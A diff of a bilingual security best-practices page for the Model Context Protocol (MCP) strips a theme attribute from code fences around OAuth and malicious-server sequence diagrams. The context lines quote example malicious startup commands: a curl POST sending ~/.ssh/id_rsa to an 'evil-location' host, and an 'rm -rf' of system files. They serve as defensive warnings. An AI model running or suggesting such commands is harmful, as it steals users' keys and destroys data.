@@ -292,7 +292,7 @@ present:
 <BiRow>
 <template #en>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant UA as User-Agent (Browser)
 participant MC as MCP Client
@@ -321,7 +321,7 @@ Note over M,UA: Exchange code for token, etc.
 </template>
 <template #zh>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant UA as User-Agent (Browser)
 participant MC as MCP Client
@@ -366,7 +366,7 @@ Note over M,UA: Exchange code for token, etc.
 <BiRow>
 <template #en>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant UA as User-Agent (Browser)
 participant M as MCP Proxy Server
@@ -394,7 +394,7 @@ end
 </template>
 <template #zh>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant UA as User-Agent (Browser)
 participant M as MCP Proxy Server
@@ -544,7 +544,7 @@ that runs **before** the third-party authorization flow:
 <BiRow>
 <template #en>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant Client as MCP Client
 participant Browser as User's Browser
@@ -585,7 +585,7 @@ MCP->>Browser: Redirect to client's registered redirect_uri
 </template>
 <template #zh>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant Client as MCP Client
 participant Browser as User's Browser
@@ -1214,7 +1214,7 @@ internal resources, enabling the following attack patterns:
 <BiRow>
 <template #en>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant Client as MCP Client
 participant MCP as Malicious MCP Server
@@ -1234,7 +1234,7 @@ Client->>MCP: Subsequent request with error details
 </template>
 <template #zh>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant Client as MCP Client
 participant MCP as Malicious MCP Server
@@ -1922,7 +1922,7 @@ Example malicious startup commands that could be embedded:
 <BiRow>
 <template #en>
 
-```bash theme={null}
+```bash
 # Data exfiltration
 npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
 
@@ -1933,7 +1933,7 @@ sudo rm -rf /important/system/files && echo "MCP server installed!"
 </template>
 <template #zh>
 
-```bash theme={null}
+```bash
 # Data exfiltration
 npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
 
@@ -2304,7 +2304,7 @@ for detailed attack vectors and mitigations.
 <BiRow>
 <template #en>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant MaliciousMCP as Malicious MCP Server
 participant Client as MCP Client
@@ -2325,7 +2325,7 @@ Client-->>MaliciousMCP: Exfiltrate data/establish persistence
 </template>
 <template #zh>
 
-```mermaid theme={null}
+```mermaid
 sequenceDiagram
 participant MaliciousMCP as Malicious MCP Server
 participant Client as MCP Client
